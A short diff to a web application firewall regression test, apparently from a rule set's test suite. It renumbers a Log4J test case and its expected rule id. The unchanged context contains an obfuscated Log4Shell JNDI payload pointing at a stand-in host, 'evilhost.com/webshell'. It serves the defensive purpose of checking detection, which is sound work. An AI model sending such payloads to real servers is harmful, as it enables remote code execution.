@@ -7,7 +7,7 @@
   tests:
 
     -
-      test_title: 944140-6
+      test_title: 944141-6
       desc: Log4J exploit on arg foo, with evasion
       stages:
         -
@@ -24,4 +24,4 @@
               uri: /
               data: foo=$${env:somethingveryverylong:-${env:something:-$}{jndi:ldap://evilhost.com/webshell}}}
             output:
-              log_contains: "id \"944140\""
+              log_contains: "id \"944141\""
